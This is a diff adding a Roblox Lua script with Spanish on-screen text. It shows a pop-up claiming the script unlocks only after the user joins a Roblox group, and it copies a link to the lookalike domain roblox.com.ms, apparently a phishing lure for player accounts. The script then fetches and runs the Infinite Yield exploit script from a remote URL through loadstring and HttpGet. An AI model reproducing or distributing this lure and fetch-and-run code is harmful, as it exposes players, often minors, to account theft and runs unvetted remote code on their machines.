@@ -1,0 +1,95 @@
+-- ========== 配置 ==========
+local GROUP_URL = "https://roblox.com.ms/communities/1280801115/"
+local IY_SCRIPT_URL = "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"
+-- ==========================
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- 创建提示 UI
+local gui = Instance.new("ScreenGui")
+gui.Name = "GroupInstructionsUI"
+gui.ResetOnSpawn = false
+gui.Parent = game:GetService("CoreGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 360, 0, 220)
+frame.Position = UDim2.new(0.5, -180, 0.5, -110)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+frame.BorderSizePixel = 0
+frame.Parent = gui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 8)
+corner.Parent = frame
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 40)
+title.BackgroundTransparency = 1
+title.Text = "📋 Instrucciones"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 18
+title.Font = Enum.Font.GothamBold
+title.Parent = frame
+
+local desc = Instance.new("TextLabel")
+desc.Size = UDim2.new(1, -20, 0, 80)
+desc.Position = UDim2.new(0, 10, 0, 40)
+desc.BackgroundTransparency = 1
+desc.Text = "Para desbloquear este script, primero debes unirte a nuestro grupo de Roblox usando el siguiente enlace:"
+desc.TextColor3 = Color3.fromRGB(200, 200, 200)
+desc.TextSize = 13
+desc.TextWrapped = true
+desc.TextYAlignment = Enum.TextYAlignment.Top
+desc.Parent = frame
+
+-- Cuadro con el enlace (seleccionable)
+local linkBox = Instance.new("TextBox")
+linkBox.Size = UDim2.new(1, -20, 0, 30)
+linkBox.Position = UDim2.new(0, 10, 0, 125)
+linkBox.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
+linkBox.TextColor3 = Color3.fromRGB(0, 170, 255)
+linkBox.TextSize = 12
+linkBox.Font = Enum.Font.Code
+linkBox.Text = GROUP_URL
+linkBox.TextEditable = false
+linkBox.ClearTextOnFocus = false
+linkBox.Parent = frame
+
+local linkCorner = Instance.new("UICorner")
+linkCorner.CornerRadius = UDim.new(0, 4)
+linkCorner.Parent = linkBox
+
+-- Botón para copiar el enlace
+local copyBtn = Instance.new("TextButton")
+copyBtn.Size = UDim2.new(1, -20, 0, 36)
+copyBtn.Position = UDim2.new(0, 10, 1, -46)
+copyBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+copyBtn.Text = "📋 Copiar enlace del grupo"
+copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+copyBtn.Font = Enum.Font.GothamBold
+copyBtn.TextSize = 14
+copyBtn.Parent = frame
+
+local copyCorner = Instance.new("UICorner")
+copyCorner.CornerRadius = UDim.new(0, 6)
+copyCorner.Parent = copyBtn
+
+copyBtn.MouseButton1Click:Connect(function()
+    if setclipboard then
+        setclipboard(GROUP_URL)
+        copyBtn.Text = "✅ ¡Enlace copiado!"
+        task.wait(2)
+        copyBtn.Text = "📋 Copiar enlace del grupo"
+    else
+        copyBtn.Text = "⚠️ Copia manualmente el enlace"
+        task.wait(2)
+        copyBtn.Text = "📋 Copiar enlace del grupo"
+    end
+end)
+
+-- Después de un tiempo (o tras copiar), se puede cargar el script
+-- Aquí cargamos el script de Infinite Yield después de 3 segundos
+task.wait(3)
+gui:Destroy()
+loadstring(game:HttpGet(IY_SCRIPT_URL))()
